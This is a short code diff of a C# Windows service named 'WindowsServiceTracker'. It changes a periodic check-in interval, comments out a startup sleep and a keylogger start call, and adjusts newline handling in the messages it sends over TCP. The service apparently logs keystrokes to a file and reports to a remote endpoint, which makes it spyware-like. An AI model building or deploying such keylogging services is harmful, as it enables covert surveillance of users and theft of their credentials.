@@ -38,7 +38,7 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
-        public const int checkInWaitTime = 20000; //todo increase to ~5min after debugging
+        public const int checkInWaitTime = 60000; //todo increase to ~5min after debugging
 
         //Variables
         private volatile String ipAddressString = "127.0.0.1";
@@ -88,7 +88,7 @@ namespace WindowsServiceTracker
             //System.Diagnostics.Debugger.Launch();
 
             //Keep the service running for 15 seconds
-            Thread.Sleep(15000);
+            //Thread.Sleep(15000);
 
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
@@ -117,7 +117,7 @@ namespace WindowsServiceTracker
 
             CreateOpenPipe();
             keyLogFilePath = GetKeylogFilePath();
-            StartKeylogger(); //todo remove after debugging
+            //StartKeylogger(); //todo remove after debugging
 
             tcpThread = new Thread(this.IpConnectionThread);
             tcpThread.Start();
@@ -400,7 +400,7 @@ namespace WindowsServiceTracker
         {
             int msgSize = 0;
             int offset = 0;
-            byte[] newLineBytes = Encoding.UTF8.GetBytes(Environment.NewLine);
+            byte[] newLineBytes = Encoding.UTF8.GetBytes("\n");
             byte[] combinedMsg;
             try
             {
@@ -478,7 +478,7 @@ namespace WindowsServiceTracker
             }
             else
             {
-                byteMsg = Encoding.UTF8.GetBytes(msg + Environment.NewLine);
+                byteMsg = Encoding.UTF8.GetBytes(msg + "\n");
                 return SendStdMsg(false, NO_OP, byteMsg, newLine);
             }
         }
@@ -495,7 +495,7 @@ namespace WindowsServiceTracker
             }
             else
             {
-                byteMsg = Encoding.UTF8.GetBytes(msg + Environment.NewLine);
+                byteMsg = Encoding.UTF8.GetBytes(msg + "\n");
                 return SendStdMsg(opcode, byteMsg, newLine);
             }
         }
